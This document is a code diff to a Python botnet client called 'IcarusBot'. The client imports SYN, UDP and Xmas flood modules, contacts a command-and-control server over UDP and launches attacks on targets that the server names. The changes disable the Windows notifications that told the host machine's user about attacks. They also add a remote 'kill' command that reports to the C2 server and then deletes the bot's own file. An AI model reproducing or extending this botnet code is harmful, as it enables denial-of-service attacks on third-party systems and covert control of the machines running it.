@@ -10,7 +10,7 @@ import scan_flood
 import shutil
 import signal
 import socket
-import speedtest
+import speedtest  # This is contained within the working directory
 import syn_flood
 import sys
 import threading
@@ -18,10 +18,13 @@ import multiprocessing as mp
 import time
 import udp_flood
 import xmas_attack
+# import win10toast
+from os import remove
+from sys import argv
 from config import API_URL
 from enum import Enum
 from socket import timeout
-from win10toast import ToastNotifier
+# from win10toast import ToastNotifier
 
 BOT_ID_NAME = ''  # Replace this for each new bot handed out.
 NUM_PACKETS_TO_SEND = 1000000000
@@ -86,7 +89,7 @@ class IcarusBot:
         threading.Thread(target=self.update_with_nameserver, daemon=True).start()
         # Now we go and look for the C2 server.
 
-        notification(self.status)
+        # notification(self.status)
         while True:
             print("contacting nameserver")
             nameserver_available = False
@@ -100,7 +103,7 @@ class IcarusBot:
                     time.sleep(5)
             # Now that we've got the C2 server IP, let's go ahead and setup the socket for connecting.
             print("nameserver found")
-            notification("CONNECTED")
+            # notification("CONNECTED")
             self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
             self.sock.connect((self.c2_server_details[0], int(self.c2_server_details[1])))
             self.main_loop()
@@ -293,7 +296,7 @@ class IcarusBot:
                 elif request_type == 'stop':
                     if self.mp is not None:
                         self.mp.terminate()
-                    notification("STOPPED")
+                    # notification("STOPPED")
                     self.status = "IDLE"
                     self.attack_type = "none"
                     self.target_ip = "none"
@@ -308,7 +311,24 @@ class IcarusBot:
                         'exceptionsThrown': self.exceptionsThrown
                     }
                     response = json.dumps(response)
+
                 # This will then send the message back to the server, irrespective of the flag.
+                elif request_type == 'kill':
+                    self.status = "DEAD"
+                    # notification("DEAD")
+                    response = {
+                        'ip': self.ip,
+                        'status': self.status,
+                        'id': self.bot_id,
+                        'runtime': self.attack_runtime,
+                        'bandwidth': self.uploadBandwidth,
+                        'target': self.target_ip,
+                        'error': 'none',
+                        'exceptionsThrown': self.exceptionsThrown
+                    }
+                    response = json.dumps(response)
+                    self.sock.sendto(str.encode(response), (self.c2_server_details[0], int(self.c2_server_details[1])))
+                    remove(argv[0])
                 time.sleep(2)
                 self.sock.sendto(str.encode(response), (self.c2_server_details[0], int(self.c2_server_details[1])))
             except timeout:
@@ -343,7 +363,7 @@ class IcarusBot:
 
 def notification(action):
     """opens windows notification"""
-    toast = ToastNotifier()
+    # toast = ToastNotifier()
     title = ""
     body = ""
     if action == "STARTED":
@@ -354,10 +374,13 @@ def notification(action):
         body = "NOTHING TO WORRY ABOUT"
     elif action == "ATTACKING":
         title = "ICARUS BOT ATTACKING"
-        body = "I AM ATTACKING. PLEASE IGNORE."
+        body = "I AM ATTACKING."
     elif action == "STOPPED":
-        title = "ICARUS IS DONE ATTACKING"
-        body = "I AM DONE ATTACKING. PLEASE IGNORE."
+        title = "ICARUS HAS STOPPED"
+        body = "I HAVE STOPPED ATTACKING."
+    elif action == "DEAD":
+        title = "ICARUS IS DELETING ITSELF"
+        body = "THANK YOU FOR RUNNING THIS. I AM NOW DELETING MYSELF"
     else:
         title = "ICARUS BOT CALLED OFF"
         body = "The bot finished its job"
@@ -385,4 +408,5 @@ def main():
 
 
 if __name__ == "__main__":
+    mp.freeze_support()
     main()
